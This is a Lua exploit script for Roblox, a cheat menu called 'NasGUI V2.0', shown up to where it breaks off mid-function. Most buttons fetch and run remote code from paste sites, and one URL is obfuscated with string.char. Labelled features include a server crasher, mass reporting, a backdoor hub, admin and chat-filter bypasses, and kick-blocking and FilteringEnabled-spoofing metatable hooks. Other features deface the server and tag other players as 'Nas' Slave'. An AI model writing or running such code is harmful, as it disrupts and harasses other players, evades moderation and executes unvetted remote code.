print(">> Nas9229alt's SUPER OP NasGUI V2.0 loaded successfully, GO REKT THEM NOW!!! (BY NAS / nas9229alt & JAN / 1602sasa2)")

-- Extra hype paragraph
print([[
Welcome to NasGUI V2.0 – the ultimate game-breaching experience! 
Prepare yourself for an unstoppable arsenal of features: custom admin commands, player utilities, remote scanning, and much more. 
Everything has been optimized for speed and power, giving you full control over your gameplay. 
This is the culmination of pure skill and coding precision by Nas9229alt & Jan – enjoy responsibly and have fun dominating the server!
]])

-- Services
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local TweenService = game:GetService("TweenService")
local RunService = game:GetService("RunService")


-- Play startup sound
local startupSound = Instance.new("Sound", workspace)
startupSound.SoundId = "rbxassetid://126083075694948"
startupSound.Volume = 5
startupSound:Play()


-- Billboard GUI on player head
pcall(function()
    local char = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
    local head = char:WaitForChild("Head")
    local msg = "NasGUI V2.0 Loaded! | Made by: Nas9229alt & 1602sasa2/Jan"


    local Billboard = Instance.new("BillboardGui", head)
    Billboard.Size = UDim2.new(0, 200, 0, 50)
    Billboard.StudsOffset = Vector3.new(0, 2, 0)
    Billboard.Adornee = head
    Billboard.AlwaysOnTop = true
    Billboard.Name = "AutoChatAd"


    local text = Instance.new("TextLabel", Billboard)
    text.Size = UDim2.new(1, 0, 1, 0)
    text.BackgroundTransparency = 1
    text.TextScaled = true
    text.TextColor3 = Color3.fromRGB(255, 0, 0)
    text.Font = Enum.Font.SourceSansBold
    text.Text = msg


    task.delay(10, function()
        Billboard:Destroy()
    end)
end)


-- GUI Setup with Blackish-Red Theme
local gui = Instance.new("ScreenGui", game.CoreGui)
gui.Name = "NasGUI"
gui.ResetOnSpawn = false


local mainFrame = Instance.new("Frame", gui)
mainFrame.Size = UDim2.new(0, 450, 0, 400) -- Compact size for luxury feel
mainFrame.Position = UDim2.new(0.5, -225, 0.5, -200)
mainFrame.BackgroundColor3 = Color3.fromRGB(20, 0, 0) -- Blackish-red
mainFrame.BorderColor3 = Color3.fromRGB(255, 50, 50) -- Red accent
mainFrame.BorderSizePixel = 2
mainFrame.Active = true
mainFrame.Draggable = true


-- Cozy Background Image (replace with your preferred cozy image ID)
local bgImage = Instance.new("ImageLabel", mainFrame)
bgImage.Size = UDim2.new(1, 0, 1, 0)
bgImage.BackgroundTransparency = 1
bgImage.Image = "rbxassetid://82411403129832" -- Cozy red/black abstract vibe
bgImage.ImageTransparency = 0.3
bgImage.ZIndex = 0


-- Title
local title = Instance.new("TextLabel", mainFrame)
title.Size = UDim2.new(1, -80, 0, 30)
title.Position = UDim2.new(0, 10, 0, 5)
title.BackgroundTransparency = 1
title.Text = "NasGUI Reborn v2.0 MODDED"
title.Font = Enum.Font.GothamBlack
title.TextSize = 20
title.TextColor3 = Color3.fromRGB(228, 42, 42)
title.TextXAlignment = Enum.TextXAlignment.Left
title.ZIndex = 1


-- Close Button
local close = Instance.new("TextButton", mainFrame)
close.Size = UDim2.new(0, 30, 0, 30)
close.Position = UDim2.new(1, -40, 0, 5)
close.Text = "X"
close.BackgroundColor3 = Color3.fromRGB(128, 0, 0)
close.TextColor3 = Color3.fromRGB(255, 255, 255)
close.Font = Enum.Font.GothamBold
close.TextSize = 16
close.ZIndex = 1
close.MouseButton1Click:Connect(function()
    gui:Destroy()
end)


-- Minimize and Toggle Button
local minimize = Instance.new("TextButton", mainFrame)
minimize.Size = UDim2.new(0, 30, 0, 30)
minimize.Position = UDim2.new(1, -75, 0, 5)
minimize.Text = "–"
minimize.BackgroundColor3 = Color3.fromRGB(128, 0, 0)
minimize.TextColor3 = Color3.fromRGB(255, 255, 255)
minimize.Font = Enum.Font.GothamBold
minimize.TextSize = 16
minimize.ZIndex = 1


local toggle = Instance.new("ImageButton", gui)
toggle.Size = UDim2.new(0, 50, 0, 50)
toggle.Position = UDim2.new(0, 20, 0, 200)
toggle.Image = "rbxassetid://120853264656112"
toggle.BackgroundColor3 = Color3.fromRGB(128, 0, 0)
toggle.BorderColor3 = Color3.fromRGB(255, 50, 50)
toggle.Visible = false
toggle.Draggable = true


-- Smooth animations for minimize/toggle
local tweenInfo = TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.InOut)
minimize.MouseButton1Click:Connect(function()
    TweenService:Create(mainFrame, tweenInfo, {Size = UDim2.new(0, 450, 0, 0)}):Play()
    task.wait(0.3)
    mainFrame.Visible = false
    toggle.Visible = true
end)


toggle.MouseButton1Click:Connect(function()
    mainFrame.Visible = true
    TweenService:Create(mainFrame, tweenInfo, {Size = UDim2.new(0, 450, 0, 400)}):Play()
    toggle.Visible = false
end)


-- Tab Frame
local tabFrame = Instance.new("Frame", mainFrame)
tabFrame.Size = UDim2.new(1, -20, 0, 40)
tabFrame.Position = UDim2.new(0, 10, 0, 40)
tabFrame.BackgroundTransparency = 1
tabFrame.ZIndex = 1


-- Containers for Tabs
local containerMain = Instance.new("Frame", mainFrame)
containerMain.Size = UDim2.new(1, -20, 1, -90)
containerMain.Position = UDim2.new(0, 10, 0, 80)
containerMain.BackgroundTransparency = 1
containerMain.Visible = true
containerMain.ZIndex = 1


local containerExec = Instance.new("Frame", mainFrame)
containerExec.Size = containerMain.Size
containerExec.Position = containerMain.Position
containerExec.BackgroundTransparency = 1
containerExec.Visible = false
containerExec.ZIndex = 1


local containerMisc = Instance.new("Frame", mainFrame)
containerMisc.Size = containerMain.Size
containerMisc.Position = containerMain.Position
containerMisc.BackgroundTransparency = 1
containerMisc.Visible = false
containerMisc.ZIndex = 1


local containerClientServer = Instance.new("Frame", mainFrame)
containerClientServer.Size = containerMain.Size
containerClientServer.Position = containerMain.Position
containerClientServer.BackgroundTransparency = 1
containerClientServer.Visible = false
containerClientServer.ZIndex = 1


-- Tab Buttons
local function createTabButton(name, pos, callback)
    local b = Instance.new("TextButton", tabFrame)
    b.Size = UDim2.new(0, 100, 0, 30)
    b.Position = UDim2.new(0, pos, 0, 5)
    b.Text = name
    b.BackgroundColor3 = Color3.fromRGB(128, 0, 0)
    b.TextColor3 = Color3.fromRGB(255, 255, 255)
    b.Font = Enum.Font.GothamBold
    b.TextSize = 14
    b.ZIndex = 1
    b.MouseButton1Click:Connect(callback)
end


createTabButton("Main", 0, function()
    containerMain.Visible = true
    containerExec.Visible = false
    containerMisc.Visible = false
    containerClientServer.Visible = false
end)
createTabButton("Executor", 110, function()
    containerMain.Visible = false
    containerExec.Visible = true
    containerMisc.Visible = false
    containerClientServer.Visible = false
end)
createTabButton("Misc", 220, function()
    containerMain.Visible = false
    containerExec.Visible = false
    containerMisc.Visible = true
    containerClientServer.Visible = false
end)
createTabButton("Client-Server (WIP)", 330, function()
    containerMain.Visible = false
    containerExec.Visible = false
    containerMisc.Visible = false
    containerClientServer.Visible = true
end)


-- Main Tab ScrollingFrame
local scrollMain = Instance.new("ScrollingFrame", containerMain)
scrollMain.Size = UDim2.new(1, 0, 1, 0)
scrollMain.BackgroundTransparency = 1
scrollMain.ScrollBarThickness = 5
scrollMain.ScrollBarImageColor3 = Color3.fromRGB(102, 0, 0)
scrollMain.CanvasSize = UDim2.new(0, 0, 0, 0) -- Auto-adjusted later
scrollMain.ZIndex = 1


local mainLayout = Instance.new("UIListLayout", scrollMain)
mainLayout.Padding = UDim.new(0, 10)
mainLayout.SortOrder = Enum.SortOrder.LayoutOrder


-- Button Creation Helper
local function createButton(parent, text, y, callback)
    local btn = Instance.new("TextButton", parent)
    btn.Size = UDim2.new(1, -20, 0, 40)
    btn.Position = UDim2.new(0, 10, 0, y)
    btn.Text = text
    btn.TextSize = 14
    btn.BackgroundColor3 = Color3.fromRGB(128, 0, 0)
    btn.TextColor3 = Color3.fromRGB(255, 255, 255)
    btn.Font = Enum.Font.Gotham
    btn.ZIndex = 1
    btn.MouseButton1Click:Connect(callback)
    return btn
end


-- Main Tab Buttons
local buttons = {
    {"Set Skybox", function()
        local id = "rbxassetid://82411403129832"
        local s = Instance.new("Sky", game.Lighting)
        s.SkyboxBk = id s.SkyboxDn = id s.SkyboxFt = id
        s.SkyboxLf = id s.SkyboxRt = id s.SkyboxUp = id
    end},
    {"Play Song", function()
        local snd = Instance.new("Sound", workspace)
        snd.SoundId = "rbxassetid://114573847650036"
        snd.Looped = true snd.Volume = 10 snd.PlaybackSpeed = 0.17 snd:Play()
    end},
    {"Decal Spam", function()
        -- ID of the decal
local decalId = "130720573923509"

-- Function to apply decal to a part
local function applyDecal(part)
    if part:IsA("BasePart") then
        -- Apply decal on all 6 surfaces
        local surfaces = {
            Enum.NormalId.Top,
            Enum.NormalId.Bottom,
            Enum.NormalId.Left,
            Enum.NormalId.Right,
            Enum.NormalId.Front,
            Enum.NormalId.Back
        }
        for _, surface in pairs(surfaces) do
            local decal = Instance.new("Decal")
            decal.Texture = "rbxassetid://" .. decalId
            decal.Face = surface
            decal.Parent = part
        end
    end
end

-- Loop through all descendants in workspace
for _, obj in pairs(workspace:GetDescendants()) do
    applyDecal(obj)
end

-- Optional: run whenever new parts are added
workspace.DescendantAdded:Connect(function(obj)
    applyDecal(obj)
end)

print("All parts now have the decal everywhere! 🗿")
    end},
    {"Set Particles", function()
        for _, v in pairs(workspace:GetDescendants()) do
            if v:IsA("BasePart") then
                local p = Instance.new("ParticleEmitter", v)
                p.Texture = "rbxassetid://82411403129832"
            end
        end
    end},
    {"ServerHint Message", function()
        local h = Instance.new("Hint", workspace)
        h.Text = "BOW DOWN TO NAS9229ALT & HAXSTER998 CUZ WE PWNED THIS GAME LOL"
    end},
    {"Nameless Admin", function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/ltseverydayyou/Nameless-Admin/main/Source.lua"))()
    end},
    {"Disco Fog", function()
        local Lighting = game:GetService("Lighting")
        if Lighting:FindFirstChild("DiscoFogConnection") then
            Lighting.DiscoFogConnection:Disconnect()
        end
        local discoConnection = RunService.RenderStepped:Connect(function()
            Lighting.FogColor = Color3.new(math.random(), math.random(), math.random())
        end)
        Lighting:SetAttribute("DiscoFogConnection", discoConnection)
    end},
    {"Btools", function()
        loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Btools-41524"))()
    end},
    {"Inf Yield", function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))()
    end},
    {"Jork", function()
        loadstring(game:HttpGet("https://pastefy.app/lawnvcTT/raw", true))()
    end},
    {"Sirius", function()
        loadstring(game:HttpGet('https://sirius.menu/sirius'))()
    end},
    {"Skrubl0rdz Skybox", function()
        loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-c00lkidd-skybox-script-10964"))()
    end},
    {"007n7 Decal Spam", function()
        loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-007n7-decal-spam-Not-FE-26963"))()
    end},
    {"Dex Explorer", function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/infyiff/backup/main/dex.lua"))()
    end},
    {"SimpleSpy", function()
        loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-SimpleSpy-20145"))()
    end},
    {"FE Invisible", function()
        loadstring(game:HttpGet("https://pastefy.app/mjkbQzXk/raw"))()
    end},
    {"Anti-Bang", function()
        loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Anti-Bang-Script-39958"))()
    end},
    {"Freaky Ahh Messages", function()
        loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Freaky-ahh-quotes-by-me-43270"))()
    end},
    {"Fake R6 FE", function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/ALLAHSIZV0C0N456793/Hj/refs/heads/main/R6.txt"))()
    end},
    {"c00lgui by team c00lkidd", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/C00lHamoot/c00lgui-1/36410b4f949d3a10e8b39fc7cdcc8cfb67aefe25/c00l%20gui"))()
    end},
    {"Skeleton Skybox", function()
        loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Skeleton-skybox-53658"))()
    end},
    {"Anti-Chat Logger", function()
        loadstring(game:HttpGet("https://pastebin.com/raw/qjDfA6E5"))()
    end},
    {"Dance GUI by Nas", function()
        loadstring(game:HttpGet("https://pastefy.app/lmRy7mqO/raw"))()
    end},
    {"FE Goofy Animations", function()
        loadstring(game:HttpGet("https://pastebin.com/raw/UQhaBfEZ"))()
    end},
    {"Lag All Players", function()
        loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-FE-TOOL-SERVER-CRASHER-30316"))()
    end},
    {"R6 Animations GUI", function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/ocfi/aqua-hub-is-a-skid-lol/refs/heads/main/animatrix"))()
    end},
    {"OP Sword Tool", function()
        loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Linked-Sword-R6-Script-40329"))()
    end},
    {"FE KJ R6", function()
        loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Universal-Temu-KJ-IMPROVED-19618"))()
    end},
    {"Auto Heal", function()
        spawn(function()
            while task.wait(1) do
                local player = game.Players.LocalPlayer
                if player.Character and player.Character:FindFirstChild("Humanoid") then
                    player.Character.Humanoid.Health = player.Character.Humanoid.MaxHealth
                end
            end
        end)
    end},
    {"Animation Grabber", function()
        loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Anim-Grabber-21176"))()
    end},
    {"LALOL Hub Backdoor", function()
        loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-LALOL-Hub-Backdoor-58564"))()
    end},
    {"Billboard GUI", function()
        local billboard = Instance.new("BillboardGui")
        billboard.Adornee = game.Players.LocalPlayer.Character:FindFirstChild("Head")
        billboard.Size = UDim2.new(0, 200, 0, 50)
        billboard.StudsOffset = Vector3.new(0, 2, 0)
        billboard.AlwaysOnTop = true
        billboard.Parent = game.Players.LocalPlayer.Character.Head


        local label = Instance.new("TextLabel")
        label.Size = UDim2.new(1, 0, 1, 0)
        label.BackgroundTransparency = 1
        label.Text = "HAXSTER998"
        label.TextColor3 = Color3.new(1, 0, 0)
        label.TextScaled = true
        label.Font = Enum.Font.SourceSansBold
        label.Parent = billboard
    end},
    {"c00lclan v2", function()
        loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-c00lclan-v2-52915"))()
    end},
    {"FE Collection", function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/sypcerr/FECollection/refs/heads/main/script.lua", true))()
    end},
    {"FE John Doe", function()
        loadstring(game:HttpGet('https://pastebin.com/raw/sB9Wwx9v', true))()
    end},
    {"Billboard Others", function()
        for _, player in pairs(Players:GetPlayers()) do
            if player ~= LocalPlayer and player.Character and player.Character:FindFirstChild("Head") then
                local head = player.Character.Head
                if head:FindFirstChild("NasSlaveBillboard") then
                    head.NasSlaveBillboard:Destroy()
                end
                local billboard = Instance.new("BillboardGui")
                billboard.Name = "NasSlaveBillboard"
                billboard.Size = UDim2.new(0, 200, 0, 50)
                billboard.StudsOffset = Vector3.new(0, 2, 0)
                billboard.Adornee = head
                billboard.AlwaysOnTop = true
                billboard.Parent = head
                local label = Instance.new("TextLabel", billboard)
                label.Size = UDim2.new(1, 0, 1, 0)
                label.BackgroundTransparency = 1
                label.Text = "Nas' Slave"
                label.TextColor3 = Color3.fromRGB(255, 255, 255)
                label.TextScaled = true
                label.Font = Enum.Font.SourceSansBold
            end
        end
    end},
    {"Nas' Trail", function()
        local char = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
        local hrp = char:WaitForChild("HumanoidRootPart")
        if hrp:FindFirstChild("NasTrailAttachment0") then
            for _, obj in pairs(hrp:GetChildren()) do
                if obj:IsA("Trail") or obj:IsA("Attachment") then
                    obj:Destroy()
                end
            end
        end
        local att0 = Instance.new("Attachment")
        att0.Name = "NasTrailAttachment0"
        att0.Position = Vector3.new(0, 1, 0)
        att0.Parent = hrp
        local att1 = Instance.new("Attachment")
        att1.Name = "NasTrailAttachment1"
        att1.Position = Vector3.new(0, -1, 0)
        att1.Parent = hrp
        local trail = Instance.new("Trail")
        trail.Attachment0 = att0
        trail.Attachment1 = att1
        trail.Color = ColorSequence.new{
            ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 0, 0)),
            ColorSequenceKeypoint.new(1, Color3.fromRGB(255, 255, 0))
        }
        trail.Lifetime = 1
        trail.MinLength = 0.1
        trail.LightEmission = 1
        trail.WidthScale = NumberSequence.new(0.5)
        trail.Parent = hrp
    end},
    {"FE R15 Sonic 2", function()
        loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-FE-R15-Sonic-The-Hedgehog-63923"))()
    end},
    {"Create Team", function()
        local Teams = game:GetService("Teams")
        local teamName = "TEAM NAS9229ALT JOIN TODAY!"
        local team = Teams:FindFirstChild(teamName)
        if not team then
            team = Instance.new("Team")
            team.Name = teamName
            team.TeamColor = BrickColor.new("Bright red")
            team.AutoAssignable = false
            team.Parent = Teams
        end
        local leaderstats = LocalPlayer:FindFirstChild("leaderstats")
        if not leaderstats then
            leaderstats = Instance.new("Folder")
            leaderstats.Name = "leaderstats"
            leaderstats.Parent = LocalPlayer
        end
        local teamStat = leaderstats:FindFirstChild("Team")
        if not teamStat then
            teamStat = Instance.new("StringValue")
            teamStat.Name = "Team"
            teamStat.Value = team.Name
            teamStat.Parent = leaderstats
        else
            teamStat.Value = team.Name
        end
        LocalPlayer.Team = team
    end},
    {"Universal Anti-Kick (FE)", function()
    -- Protects you from being kicked by the server
    local mt = getrawmetatable(game)
    local oldNamecall = mt.__namecall
    setreadonly(mt, false)


    mt.__namecall = newcclosure(function(self, ...)
        local args = {...}
        local method = getnamecallmethod()


        -- Block any attempt to kick the local player
        if method == "Kick" and self == game.Players.LocalPlayer then
            warn("Blocked a kick attempt!")
            return
        end


        return oldNamecall(self, ...)
    end)


    setreadonly(mt, true)


    -- Extra protection: detect scripts that try to destroy character
    local player = game.Players.LocalPlayer
    if player.Character then
        player.Character:GetPropertyChangedSignal("Parent"):Connect(function()
            if not player.Character.Parent then
                warn("Attempted to remove character! Re-parenting...")
                player.Character.Parent = workspace
            end
        end)
    end
end},
    {"Mass Report Others", function()
        loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Mass-Report-Others-42251"))()
    end},
    {"Grab Unanchored Parts", function()
        loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-FE-grab-unanchored-blocks-42313"))()
    end},
    {"FE Boogie Down", function()
        loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-FE-boogie-down-53232"))()
    end},
    {"FE Chat Bypass", function()
        loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-chisis-byp*s-54088"))()
    end},
    {"Remote-Abuse Admin", function()
        loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-remote-abuse-FE-admin-script-27923"))()
    end},
    {"Prizz Admin", function()
        loadstring(game:HttpGet("https://rawscripts.net/raw/Prison-Life-Prizz-Admin-14511"))()
    end},
    {"VC Unbanner", function()
        loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Voice-Chat-Unban-42843"))()
    end},
    {"JanGUI V2 [NEWER]", function()
        loadstring(game:HttpGet("https://pastefy.app/Sfeg0MGf/raw")()
    end},
    {"SaveInstance V2", function()
        loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Universally-saveinstance-V2-42081"))()
    end},
    {"Roblox Emotes & Animations", function()
        loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-7yd7-I-Emote-Script-48024"))()
    end},
    {"Modified Ring Parts", function()
        loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Super-modified-ring-parts-55157"))()
    end},
    {"FE NPC Control", function()
        loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Control-script-Credits-to-patrick-34156"))()
    end},
    {"FE Sword Tool", function()
        loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-FE-Classic-Sword-Fling-Tool-16842"))()
    end},
    {"Drop-Kick Tool FE", function()
        -- Drop Kick Tool Script (Executor Version)
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local lp = Players.LocalPlayer
local char = lp.Character or lp.CharacterAdded:Wait()
local hrp = char:WaitForChild("HumanoidRootPart")
local hum = char:WaitForChild("Humanoid")

-- Tool creation
local tool = Instance.new("Tool")
tool.Name = "Drop Kick"
tool.RequiresHandle = false
tool.CanBeDropped = false
tool.Parent = lp.Backpack

-- Animation setup
local anim = Instance.new("Animation")
anim.AnimationId = "rbxassetid://45737360" -- previous kick ID
local track = hum:LoadAnimation(anim)

-- Anti-spam cooldown
local canUse = true
local cooldown = 1 -- seconds

-- Dash function (controlled forward movement)
local function dash(duration, dashSpeed)
    local startTime = tick()
    local originalWalkSpeed = hum.WalkSpeed
    hum.WalkSpeed = 0 -- disable walking

    local connection
    connection = RunService.Heartbeat:Connect(function(dt)
        if tick() - startTime > duration then
            connection:Disconnect()
            hum.WalkSpeed = originalWalkSpeed
            if track.IsPlaying then track:Stop() end
            return
        end

        -- Move HRP forward in controlled manner
        local lookDir = hrp.CFrame.LookVector
        hrp.CFrame = hrp.CFrame + lookDir * dashSpeed * dt
    end)
end

-- Crash Out style fling (only affects HRP, subtle oscillation)
local hiddenfling = false
local movel = 0.1
local flingPower = 999999 -- adjust as you like

task.spawn(function()
    while true do
        RunService.Heartbeat:Wait()
        if hiddenfling and hrp then
            local vel = hrp.Velocity
            hrp.Velocity = vel * flingPower + Vector3.new(0, flingPower, 0)
            RunService.RenderStepped:Wait()
            if hrp then hrp.Velocity = vel end
            RunService.Stepped:Wait()
            if hrp then
                hrp.Velocity = vel + Vector3.new(0, movel, 0)
                movel = -movel
            end
        end
    end
end)

-- Tool activation
tool.Activated:Connect(function()
    if not canUse then return end
    canUse = false

    if track.IsPlaying then track:Stop() end
    track:Play()
    track:AdjustSpeed(1.7)

    -- Start fling immediately
    hiddenfling = true
    task.delay(1, function()
        hiddenfling = false
    end)

    -- Dash controlled
    dash(1, 39)

    task.delay(cooldown, function()
        canUse = true
    end)
end)
    end},
    {"RemoteSpy V3", function()
        loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-RemoteSpy-v3-33731"))()
    end},
    {"Mobile Shiftlock", function()
        loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Shiftlock-For-Mobile-Script-36530"))()
    end},
    {"Adonis Bypass", function()
        loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-adonis-admin-bypass-19375"))()
    end},
    {"FE Omniman R15", function()
        loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Fe-Omniman-49493"))()
    end},
    {"Retro Animations R6", function()
        loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Fe-Classic-Animations-2971"))()
    end},
    {"MorfOS", function()
   loadstring(game:HttpGet("https://raw.githubusercontent.com/formidy/morfOS/refs/heads/main/main.lua"))()
    end},
    {"Private Chat", function()
        loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-a-secretive-Fe-chat-for-communication-without-filtering-49526"))()
    end},
    
    {"FE Hug R6", function()
        loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Fe-hug-script-v1-33471"))()
    end},


    {"FilteringEnabled Status", function()
        loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-FE-checker-41897"))()
    end},
    {"Client-Side AK-47", function()
    loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-EPIC-FE-AK47-5040"))()
end},
{"Backflip", function()
    loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Backflip-Script-18595"))()
end},
{"Spin Skybox", function()
    local RunService = game:GetService("RunService")
    local lighting = game:GetService("Lighting")

    -- Find the Sky object
    local sky = lighting:FindFirstChildOfClass("Sky")
    if not sky then
        warn("Sky object not found under Lighting")
        return
    end

    -- Speed in degrees per second (adjust as needed)
    local speed = 360 * 1000000 -- 10 full rotations per second

    -- Spin loop
    RunService.RenderStepped:Connect(function(dt)
        local current = sky.SkyboxOrientation
        local newX = (current.X + speed * dt) % 360
        sky.SkyboxOrientation = Vector3.new(newX, current.Y, current.Z)
    end)
end},
{"Nas9229alt Punch Tool", function()
    -- Punch fling by Nas9229alt
    loadstring(game:HttpGet("https://pastefy.app/nZEjE2JU/raw?part=Punch%20Fling%20by%20Nas9229alt.lua"))()
end},
{"ESP", function()
    local Players = game:GetService("Players")
    local RunService = game:GetService("RunService")
    local Workspace = game:GetService("Workspace")
    local LocalPlayer = Players.LocalPlayer

    -- Function to add highlight
    local function createHighlight(parent, color)
        local existing = parent:FindFirstChild("NasESPHighlight")
        if existing then
            existing:Destroy()
        end
        local highlight = Instance.new("Highlight")
        highlight.Name = "NasESPHighlight"
        highlight.FillColor = color
        highlight.OutlineColor = color
        highlight.FillTransparency = 0.5
        highlight.OutlineTransparency = 0
        highlight.Adornee = parent
        highlight.Parent = parent
    end

    -- Track players
    local function updatePlayerESP(player)
        if player == LocalPlayer then return end
        if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
            createHighlight(player.Character, Color3.fromRGB(255,0,0)) -- red
        end
        player.CharacterAdded:Connect(function(char)
            char:WaitForChild("HumanoidRootPart")
            createHighlight(char, Color3.fromRGB(255,0,0))
        end)
    end

    for _, player in pairs(Players:GetPlayers()) do
        updatePlayerESP(player)
    end

    Players.PlayerAdded:Connect(updatePlayerESP)

    -- Track NPCs (anything in Workspace with Humanoid but not a player)
    local function updateNPCESP(npc)
        if npc:IsA("Model") and npc:FindFirstChild("Humanoid") and not Players:GetPlayerFromCharacter(npc) then
            createHighlight(npc, Color3.fromRGB(0,0,255)) -- blue
        end
    end

    for _, obj in pairs(Workspace:GetDescendants()) do
        updateNPCESP(obj)
    end

    Workspace.DescendantAdded:Connect(updateNPCESP)

    print("[ESP] Active: Players=Red, NPCs=Blue")
end},
{"Friends ESP", function()
    local Players = game:GetService("Players")
    local LocalPlayer = Players.LocalPlayer

    local function createHighlight(character, color)
        local existing = character:FindFirstChild("NasFriendsESP")
        if existing then existing:Destroy() end
        local highlight = Instance.new("Highlight")
        highlight.Name = "NasFriendsESP"
        highlight.FillColor = color
        highlight.OutlineColor = color
        highlight.FillTransparency = 0.5
        highlight.OutlineTransparency = 0
        highlight.Adornee = character
        highlight.Parent = character
    end

    local function applyToPlayer(player)
        if player == LocalPlayer then return end
        if not LocalPlayer:IsFriendsWith(player.UserId) then return end
        if player.Character then
            createHighlight(player.Character, Color3.fromRGB(255,255,0)) -- yellow
        end
        player.CharacterAdded:Connect(function(char)
            createHighlight(char, Color3.fromRGB(255,255,0))
        end)
    end

    for _, player in pairs(Players:GetPlayers()) do
        applyToPlayer(player)
    end

    Players.PlayerAdded:Connect(function(player)
        applyToPlayer(player)
    end)

    print("[Friends ESP] Active: highlighting all friends in yellow")
end},
{"FORCE TOUCH GUI", function()
    loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-FORCE-TOUCH-GUI-UNIVERSAL-OP-CAN-KILL-OR-KICK-43469"))()
end},
{"FE R15 Sonic", function()
     loadstring(game:HttpGet("https://pastefy.app/XCtZsGhP/raw"))()
end},
{"FE R15 Invincible Flight", function()
     loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Invinicible-Flight-R15-45414"))()
end},
{"JanGUI V1.0 Normal", function()
-- Jangui v1.0 Normal
-- Made by Jan

local u = string.char(
104,116,116,112,115,58,47,47,112,97,115,116,101,98,105,110,46,99,111,109,47,114,97,119,47,102,57,55,68,50,74,118,85
)
loadstring(game:HttpGet(u, true))()
end},
{"Fire TouchInterests", function()
    local Workspace = game:GetService("Workspace")
    local RunService = game:GetService("RunService")
    local toggled = false
    local connection

    local function fireTouches()
        for _, part in pairs(Workspace:GetDescendants()) do
            if part:IsA("BasePart") then
                for _, touch in pairs(part:GetTouchingParts()) do
                    -- Fire TouchInterest locally
                    for _, v in pairs(part:GetChildren()) do
                        if v:IsA("TouchTransmitter") then
                            firetouchinterest(touch, part, 0)
                            firetouchinterest(touch, part, 1)
                        end
                    end
                end
            end
        end
    end

    if not toggled then
        toggled = true
        connection = RunService.RenderStepped:Connect(fireTouches)
        print("[TouchInterests] Firing enabled")
    else
        toggled = false
        if connection then connection:Disconnect() end
        print("[TouchInterests] Firing disabled")
    end
end},
{"FE Spoofer", function()
    local Workspace = game:GetService("Workspace")
    local Players = game:GetService("Players")

    -- State
    local applied = false
    local old_index = nil
    local mt = nil

    -- Helpers to safely call executor-only APIs
    local function safe_sethidden(inst, prop, val)
        local ok, err = pcall(function()
            if setHiddenProperty then
                setHiddenProperty(inst, prop, val)
            elseif sethiddenproperty then
                sethiddenproperty(inst, prop, val)
            else
                error("no setHiddenProperty available")
            end
        end)
        return ok, err
    end

    local function safe_hook_metatable()
        local ok, got_mt = pcall(getrawmetatable, game)
        if not ok or not got_mt then
            return false, "getrawmetatable unavailable"
        end

        mt = got_mt
        local ok2 = pcall(function()
            setreadonly(mt, false)
            old_index = mt.__index
            mt.__index = newcclosure(function(self, key)
                -- Spoof Workspace.FilteringEnabled reads
                if self == Workspace and key == "FilteringEnabled" then
                    return false
                end
                -- If some code accesses game.Workspace (via game["Workspace"]), ensure it sees the same spoof
                if self == game and key == "Workspace" then
                    return Workspace
                end
                return old_index(self, key)
            end)
            setreadonly(mt, true)
        end)

        if not ok2 then
            return false, "failed to hook metatable"
        end

        return true
    end

    local function safe_unhook_metatable()
        if not mt or not old_index then return end
        pcall(function()
            setreadonly(mt, false)
            mt.__index = old_index
            setreadonly(mt, true)
        end)
    end

    -- Apply spoof (tries hidden property first, then metatable hook fallback)
    local function applySpoof()
        if applied then
            warn("[FE Spoofer] Already applied")
            return
        end

        -- Try hidden property write if executor supports it
        local ok, msg = safe_sethidden(Workspace, "FilteringEnabled", false)
        if ok then
